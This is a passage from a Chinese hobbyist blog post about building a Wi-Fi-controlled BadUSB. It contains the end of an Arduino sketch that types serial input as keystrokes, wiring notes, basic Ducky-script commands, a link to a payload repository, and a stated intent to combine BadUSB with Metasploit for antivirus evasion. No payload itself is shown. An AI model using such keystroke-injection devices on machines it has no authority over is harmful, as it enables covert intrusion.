class="line">  else if (b.equals(&quot;F12&quot;)) Keyboard.press(KEY_F12);</span><br><span class="line">  else if (b.equals(&quot;SPACE&quot;)) Keyboard.press(&apos; &apos;);</span><br><span class="line">  //else Serial.println(&quot;not found :&apos;&quot;+b+&quot;&apos;(&quot;+String(b.length())+&quot;)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">  </span><br><span class="line">  Serial.begin(BAUD_RATE);</span><br><span class="line">  ExternSerial.begin(BAUD_RATE);</span><br><span class="line"></span><br><span class="line">  pinMode(13,OUTPUT);</span><br><span class="line">  digitalWrite(13,HIGH);</span><br><span class="line"></span><br><span class="line">  Keyboard.begin();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">  if(ExternSerial.available()) &#123;</span><br><span class="line">    bufferStr = ExternSerial.readStringUntil(&quot;END&quot;);</span><br><span class="line">    Serial.println(bufferStr);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  if(bufferStr.length() &gt; 0)&#123;</span><br><span class="line">    </span><br><span class="line">    bufferStr.replace(&quot;\r&quot;,&quot;\n&quot;);</span><br><span class="line">    bufferStr.replace(&quot;\n\n&quot;,&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    while(bufferStr.length() &gt; 0)&#123;</span><br><span class="line">      int latest_return = bufferStr.indexOf(&quot;\n&quot;);</span><br><span class="line">      if(latest_return == -1)&#123;</span><br><span class="line">        Serial.println(&quot;run: &quot;+bufferStr);</span><br><span class="line">        Line(bufferStr);</span><br><span class="line">        bufferStr = &quot;&quot;;</span><br><span class="line">      &#125; else&#123;</span><br><span class="line">        Serial.println(&quot;run: &apos;&quot;+bufferStr.substring(0, latest_return)+&quot;&apos;&quot;);</span><br><span class="line">        Line(bufferStr.substring(0, latest_return));</span><br><span class="line">        last=bufferStr.substring(0, latest_return);</span><br><span class="line">        bufferStr = bufferStr.substring(latest_return + 1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    bufferStr = &quot;&quot;;</span><br><span class="line">    ExternSerial.write(0x99);</span><br><span class="line">    Serial.println(&quot;done&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/devil0x/picture/raw/master/11.09/19.png" alt="1541329587154"></p>
<p>然后rx.tx互相反接，vcc，gnd直接连。焊接就完事儿了</p>
<p>后台登陆一下192.168.4.1</p>
<p>然后程序的话直接</p>
<p>有几个命令</p>
<p>DELAY 延时</p>
<p>GUI r组合键</p>
<p>STRING ….输入字符串</p>
<p>ENTER回车</p>
<p>REM  指不在屏幕上显示东西</p>
<p>几个简单的模拟键盘按键</p>
<p>以及一些payloads源码（<a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads）" target="_blank" rel="noopener">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads）</a></p>
<h4 id="2-进阶玩法"><a href="#2-进阶玩法" class="headerlink" title="2. 进阶玩法"></a>2. 进阶玩法</h4><p>希望研究一下，badusb 配合 msf进行免杀脚本的玩法。</p>
<p>挖个坑（<a href="https://www.cnblogs.com/h2zZhou/p/6691875.html），以后填上。" target="_blank" rel="noopener">https://www.cnblogs.com/h2zZhou/p/6691875.html），以后填上。</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">devil0x</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">devil0x</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
